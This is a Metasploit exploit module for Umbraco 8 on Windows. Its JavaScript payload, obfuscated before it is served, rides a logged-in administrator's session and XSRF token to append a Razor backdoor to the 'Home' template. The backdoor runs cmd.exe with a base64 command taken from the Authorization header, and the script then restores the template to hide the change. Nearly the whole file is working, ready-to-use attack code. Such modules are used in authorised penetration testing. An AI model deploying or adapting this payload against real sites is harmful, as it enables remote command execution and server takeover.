##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# 
#
###
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::JSObfu

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Umbraco CMS Remote Command Execution via XSS',
        'Description' => %q{
          
        },
        'License' => MSF_LICENSE,
        'Author' => ['stvnhrlnd'],
        'Targets' => [
          ['Umbraco 8 on Windows', {
            'Arch' => ARCH_CMD,
            'Platform' => 'win',
            'DefaultOptions' => {
              'PAYLOAD' => 'cmd/windows/generic',
              'SRVPORT' => 80
            }
          }]
        ],
      )
    )
  end

  #
  #
  #
  def on_request_uri(cli, _request)
    js = js_obfuscate(exploit_template)
    send_response(cli, js, headers = {
      'Content-Type' => 'text/javascript'
    })
  end

  #
  #
  #
  def exploit_template
    %Q~

// Payload configuration
const cmd = "#{payload.encoded}";
const umbracoAPI = "/umbraco/backoffice/UmbracoApi";
const razorTemplateName = "Home";
const triggerURL = "/";
const triggerHeaderName = "Authorization";

(async function () {
  // Get template
  const allTemplates = await getJSON(`${umbracoAPI}/Template/GetAll`);
  const templateStub = allTemplates.find((x) =>
    x.name.includes(razorTemplateName)
  );
  const template = await getJSON(`${umbracoAPI}/Template/GetById?id=${templateStub.id}`);

  // Save original template. It will be restored later on
  const originalTemplate = template.content;

  // Add payload to the end of the template
  template.content += generatePayloadRazor();

  // Save template
  const saveTemplate = await postJSON(`${umbracoAPI}/Template/PostSave`, template);

  // Hit URL to trigger command execution
  const triggerHeaders = {};
  triggerHeaders[triggerHeaderName] = btoa(cmd);
  const triggerURLResponse = await fetch(triggerURL, {
    headers: triggerHeaders,
  });

  // Reset to original template
  template.content = originalTemplate;
  const resetTemplateResponse = await postJSON(`${umbracoAPI}/Template/PostSave`, template);

  /*
   * Helper Functions
   */

  function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
  }

  async function getJSON(url) {
    var response = await fetch(url, {
      method: "GET",
      credentials: "include",
      headers: {
        "x-umb-xsrf-token": getCookie("UMB-XSRF-TOKEN"),
      },
    });
    return fromJSON(await response.text());
  }

  async function postJSON(url, data) {
    var response = await fetch(url, {
      method: "POST",
      body: JSON.stringify(data),
      credentials: "include",
      headers: {
        "x-umb-xsrf-token": getCookie("UMB-XSRF-TOKEN"),
        "Content-Type": "application/json",
      },
    });
    return fromJSON(await response.text());
  }

  function fromJSON(responseText) {
    // Remove XSSI prevention prefix from response body before parsing
    return JSON.parse(responseText.slice(6));
  }

  function generatePayloadRazor() {
    return `
@if (!string.IsNullOrEmpty(Request.Headers["${triggerHeaderName}"]))
{
    try
    {
        var cmd = System.Text.Encoding.UTF8.GetString(
            System.Convert.FromBase64String(Request.Headers["${triggerHeaderName}"]));
        using (var process = new System.Diagnostics.Process())
        {
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/c " + cmd;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.Start();
        }
    }
    catch { }
}
`;
  }
})();

    ~
  end
end
